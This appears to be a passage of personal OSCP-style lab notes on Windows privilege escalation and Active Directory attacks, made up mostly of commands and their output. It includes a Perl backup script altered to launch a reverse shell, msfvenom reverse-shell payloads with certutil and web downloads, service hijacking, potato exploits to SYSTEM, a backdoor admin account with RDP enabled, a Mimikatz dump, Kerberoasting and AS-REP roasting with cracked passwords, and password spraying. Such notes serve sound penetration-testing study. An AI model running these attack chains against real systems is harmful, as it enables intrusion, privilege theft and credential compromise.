open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
```

```
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = \`whoami\`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
```


## Results

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe > Results`

```
Current user: jess\Admin
Backup performed using Python at : 2023-04-15T19:28:41.597000
Backup performed using Python at : 2023-04-15T19:31:41.606000
Backup performed using Python at : 2023-04-15T19:34:41.661000
```


## Exploit

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Exploit`

```
use the msfvenom shell you used to get initial access to elevate privs with this script
```

```
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = \`whoami\`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

# Execute cmd /c C:\\Users\jess\Desktop\shell.exe
exec('cmd /c C:\\Users\jess\\Desktop\\shell.exe');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
```

```
nc -nlvp 443 
listening on [any] 443 ...
connect to [192.168.119.184] from (UNKNOWN) [10.11.1.252] 10209
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
jess\Admin
```

```
auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload
File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
```

```
icacls auditTracker.exe
auditTracker.exe Everyone:(I)(F)
         BUILTIN\Admins:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\USERS:(I)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Exploitation`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=443 -f exe -o auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> cerutil -urlcache -split -f http://192.168.119.138:80/auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables>sc.exe start audtiTracker
nc -nlvp 443
```

Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.


## cmd.exe

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe`

```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
```

In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.

```
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
```

check our permission and chech which part of the path you have write access to.

```
dir /Q
dir /Q /S
```

```
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Admins .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Admins Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
```

Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges

```
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
```


## cmd.exe / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe > Enumeration`

```
https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
```

```
cp /opt/PowerUp/PowerUp.ps1 .
```

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```

```
Name               DisplayName                            StartMode PathName                                           
----               -----------                            --------- --------                                           
LSM                LSM                                    Unknown                                                      
NetSetupSvc        NetSetupSvc                            Unknown                                                      
postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...
```

```
move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
```

```
get-service *exac*
stop-service ESMexampleService*
start-service ESMexampleService*
```

```
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
```

```
net user hacker password /add
net localgroup Admins hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
```

```
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
[right click and run as Admin]
```


## JuicyPotatoNG

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > SeImpersonate > JuicyPotatoNG`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
cp /opt/juicyPotato/JuicyPotatoNG.exe .
```

```
PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe

         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!

nc -nlvp 1337                                                                                                                     
listening on [any] 1337 ...
connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
```


## PrintSpoofer

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > SeImpersonate > PrintSpoofer`

```
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC
```


## Windows PowerShell Commands

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Commands Cheat Sheet > Windows PowerShell Commands`

EXECUTION POLICY
```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
```
Show file like with Tree
```powershell
Get-ChildItem -Path "./*" -Include "*" -Recurse -ErrorAction SilentlyContinue
```
```powershell
Get-ChildItem -Path "C:\Users\*" -Include "flag.txt", "local.txt", "user.txt", "password.txt", "proof.txt", "credentials.txt" -Recurse -ErrorAction SilentlyContinue
```
Download
```powershell
wget http://192.168.123.100:8000/rev4445.exe -OutFile rev4445.exe
```
```powershell
certutil -split -urlcache -f http://192.168.123.100:8000/agent.exe agent.exe
```
Mimikatz Oneliner
```powershell
.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred" "exit"
```


## Attacking AD Capstone

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Attacking AD Capstone`

```rust
impacket-GetNPUsers -dc-ip 192.168.176.70  -request -outputfile hashes.asreproast corp.com/pete
```

```rust
$krb5asrep$23$mike@CORP.COM:70c795953000db7b375e964b459811ac$1a06a134a62bba9a33146caf62a141912eb4082210cdf6411645fb198df78d4568e867ee1137655ed1cf63603bef34152b1eff0b19d3315bab7568bf52fa3980d63f373c8debc8632606c8dcce14e054061976ba4843c930bb241158d1b94d289bed61250086357d7bfdfdec2c7e6d22c79591a7d6f32b796b3d39a09b783b6c88077731c7c3d2c469f6b6e68a152de7fe4454e6fddb34c83d33aae5a91bfe42a181452841fbbd181bec26e7d36d7b238b63518ca81a4da2666f170d73ae49eab6b1f4d7471e43f9f02098353170b2eb843b17517606fd82130aa4fe189e14b8d36d2bce
$krb5asrep$23$dave@CORP.COM:3531903500b453cae1bb08d79f7bdb8e$cc2f0333e55cab7f452a37fa5d7028012dc05846430e562371b38ce60fbd695e149c4e026a755d24b9c7d518f1f40e0497e73855e31e8af524640ad19c057362155fc696a91cdda5921aec3556daf48fce5bd2826e9277eab2b95dd4e0aec2f090bb901433760d5f6ed5f53e869de5d6ddbe2426a9a2e1406ba3fc28beabea94d3f7d0d59f1c0013ea9d15f3b25fe65cbd668d74ab5d7b02eaa8ae6e261141647619ee8a2fca3cd78e287e390ed7f7dd2ce8988f04eeff114e9683648d518c0fe2caada014bf2c0e397b1f39898ccf1dcea5c845a9f6907c8772ce2e33477fb22feacea4
```

```rust
hashcat -m 18200 cap.hash /usr/share/wordlists/rockyou.txt -r test.rule
```

```rust
$krb5asrep$23$mike@CORP.COM:70c795953000db7b375e964b459811ac$1a06a134a62bba9a33146caf62a141912eb4082210cdf6411645fb198df78d4568e867ee1137655ed1cf63603bef34152b1eff0b19d3315bab7568bf52fa3980d63f373c8debc8632606c8dcce14e054061976ba4843c930bb241158d1b94d289bed61250086357d7bfdfdec2c7e6d22c79591a7d6f32b796b3d39a09b783b6c88077731c7c3d2c469f6b6e68a152de7fe4454e6fddb34c83d33aae5a91bfe42a181452841fbbd181bec26e7d36d7b238b63518ca81a4da2666f170d73ae49eab6b1f4d7471e43f9f02098353170b2eb843b17517606fd82130aa4fe189e14b8d36d2bce:Darkness1099!
```

password spray  then use rdp

```rust
xfreerdp /u:mike /p:'Darkness1099!' /v:192.168.176.75  /dynamic-resolution
```

```rust
impacket-secretsdump corp.com/mike:'Darkness1099!'@192.168.176.75
```

```rust
[*] _SC_SNMPTrap
CORP\maria:passwordt_1415
```

```rust
 netexec rdp ips.txt -u maria -p passwordt_1415
RDP         192.168.176.75  3389   CLIENT75         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT75) (domain:corp.com) (nla:True)
RDP         192.168.176.75  3389   CLIENT75         [+] corp.com\maria:passwordt_1415 (Pwn3d!)
RDP         192.168.176.74  3389   CLIENT74         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT74) (domain:corp.com) (nla:False)
RDP         192.168.176.70  3389   DC1              [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC1) (domain:corp.com) (nla:False)
RDP         192.168.176.73  3389   FILES04          [*] Windows 10 or Windows Server 2016 Build 20348 (name:FILES04) (domain:corp.com) (nla:False)
RDP         192.168.176.72  3389   WEB04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:WEB04) (domain:corp.com) (nla:False)
RDP         192.168.176.74  3389   CLIENT74         [+] corp.com\maria:passwordt_1415 (Pwn3d!)
RDP         192.168.176.70  3389   DC1              [+] corp.com\maria:passwordt_1415 (Pwn3d!)
RDP         192.168.176.73  3389   FILES04          [+] corp.com\maria:passwordt_1415 (Pwn3d!)
RDP         192.168.176.72  3389   WEB04            [+] corp.com\maria:passwordt_1415 (Pwn3d!)
```

```rust
evil-winrm -i 192.168.176.70 -u 'maria' -p 'passwordt_1415'
```
```rust
❯ netexec rdp ips.txt -u users.txt -p 'VimForPowerShell123!'
RDP         192.168.176.75  3389   CLIENT75         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT75) (domain:corp.com) (nla:True)
RDP         192.168.176.75  3389   CLIENT75         [+] corp.com\meg:VimForPowerShell123!
RDP         192.168.176.75  3389   CLIENT75         [-] corp.com\backupuser:VimForPowerShell123! (STATUS_LOGON_FAILURE)
RDP         192.168.176.70  3389   DC1              [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC1) (domain:corp.com) (nla:False)
RDP         192.168.176.72  3389   WEB04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:WEB04) (domain:corp.com) (nla:False)
RDP         192.168.176.73  3389   FILES04          [*] Windows 10 or Windows Server 2016 Build 20348 (name:FILES04) (domain:corp.com) (nla:False)
RDP         192.168.176.70  3389   DC1              [+] corp.com\meg:VimForPowerShell123!
RDP         192.168.176.70  3389   DC1              [-] corp.com\backupuser:VimForPowerShell123! (STATUS_LOGON_FAILURE)
RDP         192.168.176.73  3389   FILES04          [+] corp.com\meg:VimForPowerShell123!
RDP         192.168.176.73  3389   FILES04          [-] corp.com\backupuser:VimForPowerShell123! (STATUS_LOGON_FAILURE)
RDP         192.168.176.74  3389   CLIENT74         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT74) (domain:corp.com) (nla:False)
RDP         192.168.176.72  3389   WEB04            [+] corp.com\meg:VimForPowerShell123!
RDP         192.168.176.72  3389   WEB04            [-] corp.com\backupuser:VimForPowerShell123! (STATUS_LOGON_FAILURE)
RDP         192.168.176.74  3389   CLIENT74         [+] corp.com\meg:VimForPowerShell123!
RDP         192.168.176.74  3389   CLIENT74         [-] corp.com\backupuser:VimForPowerShell123! (STATUS_LOGON_FAILURE)
Running nxc against 6 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

also

```rust
 ./kerbrute_linux_amd64 passwordspray -d corp.com --dc 192.168.176.70 /home/kali/oscp/labs/AAD/users.txt 'VimForPowerShell123!'

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/05/24 - Ronnie Flathers @ropnop

2024/11/05 18:28:50 >  Using KDC(s):
2024/11/05 18:28:50 >   192.168.176.70:88

2024/11/05 18:28:50 >  [+] VALID LOGIN:  meg@corp.com:VimForPowerShell123!
2024/11/05 18:28:50 >  Done! Tested 2 logins (1 successes) in 0.188 seconds
```

Asrep Roasting
```rust
❯ impacket-GetNPUsers -dc-ip 192.168.176.70  -request -outputfile hashes.asreproast corp.com/meg
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-11-05 18:30:28.061542  0x410200



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$dave@CORP.COM:147a28bbbddd5330b90e205079662caf$f97032691bf62aca48d446435dfcb4a0d0d40880cf463873a69c0862f6603a7cb03aa29aa80f988362b64fff1436aec07578b857738de2860b2b5b3ee1b5137c998ce19b46768d84a1c86b20cbd634e7b23221e3de5f27a9614a8e281aa5cab1ec293a03a859ff5e6c39370c37e8f506bdc4cbd08d84d75d16fff271b8af34bb031d66854830a48c99395af9b4b9087d19
```

Hashcat could not crack these lets try to kerberoast

```rust
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.176.70 corp.com/meg
[sudo] password for kali:
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
ServicePrincipalName    Name         MemberOf                                  PasswordLastSet             LastLogon                   Delegation
----------------------  -----------  ----------------------------------------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained
HTTP/web04              iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained
HTTP/web04.corp.com:80  iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained
http/files04.corp.com   backupuser   CN=Domain Admins,CN=Users,DC=corp,DC=com  2024-11-05 18:23:06.070653  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$aa2b8ccc3411a457f4edd20cb7e4901a$51144590904541177cfbcd35aeb3ce7d3c9fe30ab7fabbf31c06daa8fe90dfc9d0573e4abf894312c787e5fe487653a3e9764f6ee468d9a2be18d3687bf8ce51db071d24c33b379c45772ba65622aad7f687f569583d3e24b764efdf0c2931339b89faea88e53c783d363950913590f3c5193b2dabcb0d517041779795e738bb62cc9109c5c168996665b9f2fd5c114da03ef5c9c3c753d9f8fc1c440d7652c9b99847f70ff209ff3b147d131fd124f53369d747d546e1787e235c3e34566f2c4fb4542494a5b801507ea09f4f06b53c6aef40a0c93ea467a7cb9e433eaac6dec3473b04e9194a394e12ae4f2b2cade1b334b0b040f74d9567d47276d059af7d8bbea322531c6b469c370f0861d51cd46ffd41c3082724980b38d1863fb633320fb11b44050283f54b3c625538a5e1169c887f62da0b393425d21dfd3ef9f491ca1047f412ab39250a446fb7d3bd1a406a57d81516c0a05aca4dbabebe55a8418a4f37ad1a3f27acf2cf4b6a2eed2c1b0e0615956eaabb193a3ec015fbfc00fa35931b5d7b719e68772550d219c9c751da888d9006d29da8249bff5a1c58fd383ef237b1a8f97c8dd369789022e24278a687f73ce2eaea25bd93fd1498da6a5f62b9261cefa74d6580d2a72b1c669a4fd74462975b822fde3defa2b13d18c8e15430d2b605a680ab06bdbd0e3f745be07d98954905e7d26995dc38cff49e78077fbbf2271cc7e61a414c8fb4e540bbc1ae4fb806990fd9a35609664296adc2548dd28d9e371d0373a1b5395dbc10ac8a432c2165d4578caad92996447aa21e853b7911d015d99fd4beb6b7e676e8c439cb9c3e5f0bb13e6dab29efc4c440bdf786f1905dc147922202cc495501d9e9cffd53cb9b8d8ac0283c6ae420fa257179174a8cee11275d254a252549b6287dca4cd3d9183257470292393a4c316f3bd5998d88edb9bc899f9a045374b83c42785c66e0181bcd50a6619804de222d88aba3cffd327ae1d6ceee3b87cdb38a4a4c01a8b1e1ca646e6015a2b854ae2d4c95fafacceebd655c9a723c9a732c62be1a927358906e794a56d865ed7b5c7e628db9cfddd834c76636b076674053370bc75d2dc6d778548ee75e68feb482794a3c504c1743bbfd909a49a6d13db90c9cdb86e10d7ebac678a66db464e7aadc4cd3797caf63a2319fe84c8266c3636e14f747fa38a9a87646657bed06eddbcb4603ed42631c385cab8b42156931440adf3b61babb1c88d45462aefa2200941f77cb1c80b8f7a4e0b5a01f026e97879b6859e9d70d5182c3bc54c811ec0c
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$de7edf89c267542f41e6cbd60d1982f6$d5ef95ccdb87c27097f351a6aa3f7cf74cb943f02ddc8c03a1169e192e1e0bb2db4d609a8700234868127b8aa3a2073a24f7836aeffd457b431b5953f7ece437212def66b4817fda9b39ec49889fbc17d5d334230ac7f2a156154d8a80c7cb82046c95517a93b2bcf0a84f6e4daf9ebcc5fd2387fe55119f16883af7fca4e8c5c704983049e4374ca21a5f08321b1ae05da5464117dfdef265fd37ce12e85e341ed8c5cd8054b78c7e3d3dd3c1d3835b5bf23a9a5330b393e970ab55d500f72595b0cfb3822bd7b91e2cd0d52d25195fb60a3310917bcfa09aba4977e3f968be667151caa63522e3ab0ab9e7b4d126d93770ad31e8dcfb40eb01886cfb70e3e8b3a8e12a8d397b078c7574e501bcece30c29da74dab8a834290cc608df8d87ea1fb11d7041ebbdbf85ae354a630b9b3c9badbbbbec4406c7db8377f91213fe012f9a34378d6e2d8b629eed5aaf0f4e41e9a6082b67978f9230672107b6aa10eef283179ecbf00d214c6b452646dbe00b614971e46cd946d6eb44462f774b81cf674fc13aff6e9fe004766673c79035f1e4e7941f69ab8dec96363d4b19348d17aa0cf450f874f7677ac842758f27569cc506bc982906367fd1767779c9bb58a6b6391ab20626e4a62f16b20258040fb6560b373b86d6704a171b0983dd66cde5907b2d59aea7b6214b15c9dc3423f4bf9808c2afcc165b6d27bcf1bb6c11874a07fdd4915d3e3dafa5de3aff131646f7f97c8b55b92f318b480bf61492f1e36b6691c79722af4ab64bad1b5ff0caa4b408a50f03eb802df1a5b55f780ef2a2be67ac00830059c8fed2c8244dd790f8d3505bf729001131ac0ddfd224a3afbf3347b8b060cdbfb4e1316b5f7fd9de348939acf6bf9ef20177813865e1aabc9789c9c3a85a8eef71d19f32906b4f1d1b05c35af2e26d7f0a76a43ee8588c45fa790ecacb2d5ca2b227210c7beabd514a13dbe44a16a362785493261a81614f57e24af395b2284df4926913f9bfd7e23a64974f8ce86899dff8a0df273671279825373440e1134acd879f1d86f5f990ab4a01a93a79748f81f9a4bee5d9fb69895cbfea505a64ca29e8efc2707258f3da07c9094b556bb4815b2684eb543c246c425c8841376086c99fee2b7786500294b8d6d62c9cb2848c7be84221b79cd6fc7de4888c6cd021c31e6a6071af5149e55eaa702827d8c189118c65f6e62fd45d5aa8dc881e1358c5dde42ff88e87d67b085b7b731ae2adbc6743fb9679711dc434954ef5ade001d8e04b33c4a8c8d3d6c1f9938b56dc5b855e0fb62820
```

```rust
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$aa2b8ccc3411a457f4edd20cb7e4901a  
$51144590904541177cfbcd35aeb3ce7d3c9fe30ab7fabbf31c06daa8fe90dfc9d0573e4abf894312c787e5f  
e487653a3e9764f6ee468d9a2be18d3687bf8ce51db071d24c33b379c45772ba65622aad7f687f569583d3e2  
4b764efdf0c2931339b89faea88e53c783d363950913590f3c5193b2dabcb0d517041779795e738bb62cc910  
9c5c168996665b9f2fd5c114da03ef5c9c3c753d9f8fc1c440d7652c9b99847f70ff209ff3b147d131fd124f  
53369d747d546e1787e235c3e34566f2c4fb4542494a5b801507ea09f4f06b53c6aef40a0c93ea467a7cb9e4  
33eaac6dec3473b04e9194a394e12ae4f2b2cade1b334b0b040f74d9567d47276d059af7d8bbea322531c6b4  
69c370f0861d51cd46ffd41c3082724980b38d1863fb633320fb11b44050283f54b3c625538a5e1169c887f6  
2da0b393425d21dfd3ef9f491ca1047f412ab39250a446fb7d3bd1a406a57d81516c0a05aca4dbabebe55a84  
18a4f37ad1a3f27acf2cf4b6a2eed2c1b0e0615956eaabb193a3ec015fbfc00fa35931b5d7b719e68772550d  
219c9c751da888d9006d29da8249bff5a1c58fd383ef237b1a8f97c8dd369789022e24278a687f73ce2eaea2  
5bd93fd1498da6a5f62b9261cefa74d6580d2a72b1c669a4fd74462975b822fde3defa2b13d18c8e15430d2b  
605a680ab06bdbd0e3f745be07d98954905e7d26995dc38cff49e78077fbbf2271cc7e61a414c8fb4e540bbc  
1ae4fb806990fd9a35609664296adc2548dd28d9e371d0373a1b5395dbc10ac8a432c2165d4578caad929964  
47aa21e853b7911d015d99fd4beb6b7e676e8c439cb9c3e5f0bb13e6dab29efc4c440bdf786f1905dc147922  
202cc495501d9e9cffd53cb9b8d8ac0283c6ae420fa257179174a8cee11275d254a252549b6287dca4cd3d91  
83257470292393a4c316f3bd5998d88edb9bc899f9a045374b83c42785c66e0181bcd50a6619804de222d88a  
ba3cffd327ae1d6ceee3b87cdb38a4a4c01a8b1e1ca646e6015a2b854ae2d4c95fafacceebd655c9a723c9a7  
32c62be1a927358906e794a56d865ed7b5c7e628db9cfddd834c76636b076674053370bc75d2dc6d778548ee  
75e68feb482794a3c504c1743bbfd909a49a6d13db90c9cdb86e10d7ebac678a66db464e7aadc4cd3797caf6  
3a2319fe84c8266c3636e14f747fa38a9a87646657bed06eddbcb4603ed42631c385cab8b42156931440adf3  
b61babb1c88d45462aefa2200941f77cb1c80b8f7a4e0b5a01f026e97879b6859e9d70d5182c3bc54c811ec0  
c:Strawberry1  
Cracking performance lower than expected?                    
  
* Append -O to the commandline.  
 This lowers the maximum supported password/salt length (usually down to 32).  
  
* Append -w 3 to the commandline.  
 This can cause your screen to lag.  
  
* Append -S to the commandline.  
 This has a drastic speed impact but can be better for specific attacks.  
 Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
 https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
 https://hashcat.net/faq/morework  
  
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$de7edf89c267542f41e6cbd60d1982f6$d  
5ef95ccdb87c27097f351a6aa3f7cf74cb943f02ddc8c03a1169e192e1e0bb2db4d609a8700234868127b8aa  
3a2073a24f7836aeffd457b431b5953f7ece437212def66b4817fda9b39ec49889fbc17d5d334230ac7f2a15  
6154d8a80c7cb82046c95517a93b2bcf0a84f6e4daf9ebcc5fd2387fe55119f16883af7fca4e8c5c70498304  
9e4374ca21a5f08321b1ae05da5464117dfdef265fd37ce12e85e341ed8c5cd8054b78c7e3d3dd3c1d3835b5  
bf23a9a5330b393e970ab55d500f72595b0cfb3822bd7b91e2cd0d52d25195fb60a3310917bcfa09aba4977e  
3f968be667151caa63522e3ab0ab9e7b4d126d93770ad31e8dcfb40eb01886cfb70e3e8b3a8e12a8d397b078  
c7574e501bcece30c29da74dab8a834290cc608df8d87ea1fb11d7041ebbdbf85ae354a630b9b3c9badbbbbe  
c4406c7db8377f91213fe012f9a34378d6e2d8b629eed5aaf0f4e41e9a6082b67978f9230672107b6aa10eef  
283179ecbf00d214c6b452646dbe00b614971e46cd946d6eb44462f774b81cf674fc13aff6e9fe004766673c  
79035f1e4e7941f69ab8dec96363d4b19348d17aa0cf450f874f7677ac842758f27569cc506bc982906367fd  
1767779c9bb58a6b6391ab20626e4a62f16b20258040fb6560b373b86d6704a171b0983dd66cde5907b2d59a  
ea7b6214b15c9dc3423f4bf9808c2afcc165b6d27bcf1bb6c11874a07fdd4915d3e3dafa5de3aff131646f7f  
97c8b55b92f318b480bf61492f1e36b6691c79722af4ab64bad1b5ff0caa4b408a50f03eb802df1a5b55f780  
ef2a2be67ac00830059c8fed2c8244dd790f8d3505bf729001131ac0ddfd224a3afbf3347b8b060cdbfb4e13  
16b5f7fd9de348939acf6bf9ef20177813865e1aabc9789c9c3a85a8eef71d19f32906b4f1d1b05c35af2e26  
d7f0a76a43ee8588c45fa790ecacb2d5ca2b227210c7beabd514a13dbe44a16a362785493261a81614f57e24  
af395b2284df4926913f9bfd7e23a64974f8ce86899dff8a0df273671279825373440e1134acd879f1d86f5f  
990ab4a01a93a79748f81f9a4bee5d9fb69895cbfea505a64ca29e8efc2707258f3da07c9094b556bb4815b2  
684eb543c246c425c8841376086c99fee2b7786500294b8d6d62c9cb2848c7be84221b79cd6fc7de4888c6cd  
